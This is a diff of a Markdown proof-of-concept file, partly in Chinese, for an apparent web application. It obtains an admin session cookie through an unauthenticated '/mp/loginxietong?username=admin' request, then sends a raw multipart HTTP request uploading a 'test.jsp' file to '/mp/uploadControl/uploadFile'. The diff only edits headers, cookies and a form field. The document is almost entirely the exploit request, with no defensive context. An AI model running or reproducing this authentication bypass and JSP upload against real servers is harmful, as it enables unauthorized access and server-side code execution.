@@ -6,17 +6,15 @@
 ### 先获取 cookie：url+/mp/loginxietong?username=admin
 ```
 POST /mp/uploadControl/uploadFile HTTP/1.1
-Host: XXX
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
-Accept: application/json, text/javascript, */*; q=0.01
-X-Requested-With: XMLHttpRequest
-Referer: XXX
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
-Cookie: JSESSIONID=0BC397BFC1FC9415F289336DDA799DEA.server; mp_name=admin; JSESSIONID=5C421A02A53362BC6CF8F98B9A364457.server
+Host: host
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=0884AE37CCD3416B96C5546D03E67F10.server; mp_name=admin;JSESSIONID=F5E62B60F069DA492605F276E527A71C.server
 Connection: close
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
-Content-Length: 301
+Content-Length: 314
 
 ------WebKitFormBoundaryoDIsCqVMmF83ptmp
 Content-Disposition: form-data; name="file"; filename="test.jsp"
@@ -40,8 +38,7 @@ Content-Type: application/octet-stream
 ------WebKitFormBoundaryoDIsCqVMmF83ptmp
 Content-Disposition: form-data; name="submit"
 
-
- 
+上传
 ------WebKitFormBoundaryoDIsCqVMmF83ptmp
 ```
 ## POC 2
